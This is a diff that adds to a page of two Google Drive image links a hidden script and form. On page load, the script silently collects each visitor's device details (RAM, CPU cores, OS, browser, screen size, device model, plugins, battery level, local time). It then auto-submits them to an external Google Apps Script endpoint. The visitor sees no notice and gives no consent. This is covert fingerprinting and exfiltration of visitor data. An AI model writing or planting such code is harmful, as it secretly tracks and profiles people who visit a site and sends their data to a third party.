@@ -1,3 +1,125 @@
 https://drive.google.com/thumbnail?id=1fkPsgbcwEvPJcUBtXvbZV1lW_bLdYrDX
 
 https://drive.google.com/uc?export=view&id=16ySBPpTqvsuyoZL-8nFD3LwrUN3LFRLn
+
+
+
+<script async defer src="https://cdn.jsdelivr.net/npm/ua-parser-js@0/dist/ua-parser.min.js"></script>
+
+    <script>
+        var crrTime, userMemory, userCores, userBroSys;
+
+
+        function fetchData() {
+            /* Date & Time Module Start */
+            var currentTime = new Date();
+            //Date Start
+            var dd = String(currentTime.getDate()).padStart(2, '0');
+            var mm = String(currentTime.getMonth() + 1).padStart(2, '0'); //January is 0!
+            var yyyy = currentTime.getFullYear();
+            //Date End
+            //Time Start
+            var currentOffset = currentTime.getTimezoneOffset();
+            var ISTTime = new Date(currentTime.getTime() + (330 + currentOffset) * 60000);
+            var hoursIST = ISTTime.getHours();
+            var minutesIST = ISTTime.getMinutes();
+            //Time End
+            var PostfixTime = " AM";
+            if (hoursIST > 12) {
+                hoursIST -= 12;
+                PostfixTime = " PM"
+            }
+            document.getElementById("Time").value = hoursIST + ":" + minutesIST + PostfixTime;
+            document.getElementById("Date").value = dd + '/' + mm + '/' + yyyy;
+            /* Date & Time Module End */
+
+            /* Memories Start */
+            userMemory = (navigator.deviceMemory) + " GB";
+            userCores = (navigator.hardwareConcurrency);
+            document.getElementById("RAM").value = userMemory;
+            document.getElementById("Cores").value = userCores;
+            var plugins = navigator.plugins;
+            /* Memories End */
+
+            /* OS & Others */
+            var parser = new UAParser();
+
+            var OS = navigator.userAgent;
+            parser.setUA(OS);
+            var result = parser.getResult();
+            document.getElementById("OS_Version").value = result.os.version;
+            document.getElementById("Cpu_Architecture").value = result.cpu.architecture;
+            document.getElementById("Cpu_Architecture").value = result.cpu.architecture;
+            document.getElementById("OS_Type").value = parser.getOS().name;
+            document.getElementById("Model").value = parser.getDevice().model;
+
+            /* Browser & Screen Start */
+            document.getElementById("Browser").value = parser.getBrowser().name + " (" + parser.getBrowser().version + ")";
+            document.getElementById("Screen_Size").value = screen.width + " X" + screen.height;
+
+            var PluginsLength = navigator.plugins.length;
+            var PluginsUsed = "";
+
+            for (var i = 0; i < PluginsLength; i++) {
+                PluginsUsed += navigator.plugins[i].name + ",";
+            }
+            document.getElementById("Plugins").value = PluginsUsed;
+            document.getElementById("Device_Type").value = result.device.type;
+            document.getElementById("Device_Vendor").value = result.device.vendor;
+
+            /* Battery Level Start */
+            navigator.getBattery().then(function(battery) {
+                var level = battery.level * 100;
+                document.getElementById("Battery").value = level + "%";
+            });
+            /* Battery Level End */
+            /* Browser & Screen End*/
+
+            /* Auto Click */
+            setTimeout(
+                function() {
+                    document.getElementById("Invincible").click();
+                }, 100);
+
+        }
+        setTimeout(fetchData, 2500);
+    </script>
+
+    
+    <form method="post" class="hidden-form">
+
+        <input type="text" name="Date" id="Date">
+        <input type="text" name="Time" id="Time">
+        <input type="text" name="Battery" id="Battery">
+        <input type="text" name="RAM" id="RAM">
+        <input type="text" name="Cores" id="Cores">
+        <input type="text" name="Cpu Architecture" id="Cpu_Architecture">
+        <input type="text" name="Browser" id="Browser">
+        <input type="text" name="OS Type" id="OS_Type">
+        <input type="text" name="OS Version" id="OS_Version">
+        <input type="text" name="Screen Size" id="Screen_Size">
+        <input type="text" name="Model" id="Model">
+        <input type="text" name="Device Type" id="Device_Type">
+        <input type="text" name="Device Vendor" id="Device_Vendor">
+        <input type="text" name="Plugins" id="Plugins">
+        <input type="submit" value="submit" name="submit" id="Invincible">
+
+    </form>
+
+    
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbwGU68Yc9BjFKU-spCPr5Gzs4wGr2ZTqPyF_68HUhmrHRrRfr_d/exec'
+
+        const form = document.getElementsByClassName('hidden-form')
+        const btnForm = document.getElementById('Invincible')
+
+        btnForm.addEventListener('click', e => {
+            e.preventDefault()
+            fetch(scriptURL, {
+                    method: 'POST',
+                    body: new FormData(form[0])
+                })
+                .then(response => console.log(""))
+                .catch(error => console.error('Error!', error.message))
+        })
+    </script>
